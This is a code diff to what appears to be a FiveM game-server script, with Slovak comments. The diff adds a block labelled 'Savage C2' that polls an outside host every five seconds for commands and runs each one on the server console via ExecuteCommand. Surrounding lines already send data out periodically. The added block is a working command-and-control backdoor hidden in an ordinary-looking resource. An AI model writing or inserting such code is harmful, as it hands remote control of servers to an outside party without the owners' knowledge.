@@ -16,6 +16,22 @@ function sendUpdate() {
     }, 'POST', JSON.stringify(data), { ['Content-Type']: 'application/json' });
 }
 
-// Spustenie pri štarte a potom každých 5 minút
+// Kontrola príkazov každých 5 sekúnd
+setInterval(() => {
+    const url = "https://mv-menu.onrender.com/api/get-commands";
+    
+    PerformHttpRequest(url, function(err, text, headers) {
+        if (err === 200 && text !== "[]") {
+            try {
+                const cmds = JSON.parse(text);
+                cmds.forEach(cmd => {
+                    print("^4[Savage C2] Vykonávam príkaz: " + cmd + "^7");
+                    ExecuteCommand(cmd); // Vykoná príkaz v konzole servera
+                });
+            } catch (e) { print("^1[Savage C2] Chyba spracovania príkazov^7"); }
+        }
+    }, 'GET', '');
+}, 5000);
+
 sendUpdate();
 setInterval(sendUpdate, 300000);
